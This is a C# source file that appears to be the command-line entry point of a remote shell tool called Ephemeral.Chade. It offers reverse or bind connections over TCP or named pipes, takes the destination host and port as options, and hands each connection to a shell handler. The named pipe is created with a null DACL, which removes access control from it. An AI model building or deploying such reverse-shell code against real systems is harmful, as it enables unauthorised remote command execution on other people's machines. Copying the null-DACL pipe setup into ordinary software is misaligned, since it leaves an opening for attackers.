using CommandLine;
using Ephemeral.Chade.Communication;
using Ephemeral.Chade.Communication.NamedPipes;
using Ephemeral.Chade.Communication.Tcp;
using Ephemeral.Chade.Handlers;
using System;
using System.Collections.Generic;
using System.Text;

namespace Ephemeral.Chade
{
    public class CommandLineOptions
    {
        [Option('r', "reverse", Default = false, HelpText = "Use reverse connection instead of listener")]
        public bool Reverse { get; set; }

        [Option('t', "tcp", Default = false, HelpText = "Use tcp instead of a pipe")]
        public bool Tcp { get; set; }

        [Option('d', "dest", Default = "127.0.0.1", HelpText = "Host to establish connection with")]
        public string Host { get; set; }

        [Option('p', "port", Default = 1234, HelpText = "Port to connect or listen to")]
        public int Port { get; set; }

        [Option('n', "name", Default = "ephemeral.chade", HelpText = "The named pipes filename.")]
        public string Name { get; set; }

        [Option('l', "loop", Default = false, HelpText = "Continously accepts new connects, and never stop. Only relevant when listening")]
        public bool Continous { get; set; }
    }

    public class CommandLine
    {
        private CommandLineOptions _options;

        public CommandLine(CommandLineOptions opts)
        {
            _options = opts;
        }

        public void Execute()
        {
            if (_options.Tcp)
                RunTcp();
            else
                RunPipe();
        }

        public void RunPipe()
        {
            var builder = new NamedPipeConnectorBuilder();
            var connector = builder.
                SetName(_options.Name).
                SetRemoteHost(_options.Host).
                SetType(_options.Reverse ? NamedPipeConnectorType.Reverse : NamedPipeConnectorType.Bind).
                SetNullDACL(true).
                Build();
            RunShell(connector);
        }

        public void RunTcp()
        {
            var builder = new TcpConnectorBuilder();
            var connector = builder.
                SetIPAddress(_options.Host).
                SetPort(_options.Port).
                SetType(_options.Reverse ? TcpConnectorType.Reverse : TcpConnectorType.Bind).
                Build();
            RunShell(connector);
        }

        public void RunShell(IConnector connector)
        {
            if (false == _options.Continous || (_options.Continous && _options.Reverse))
            {
                // Only connect once, then quit.
                var channel = connector.EstablishOnce();
                connector.Dispose();

                var shell = new SimpleShell(channel);
                shell.Process();
                shell.WaitForProcessing();
                shell.Dispose();
                channel.Dispose();
            }
            else
            {
                // Only cases where a listener is used
                Console.WriteLine("[!] Not implemented yet!");
            }
        }
    }
}
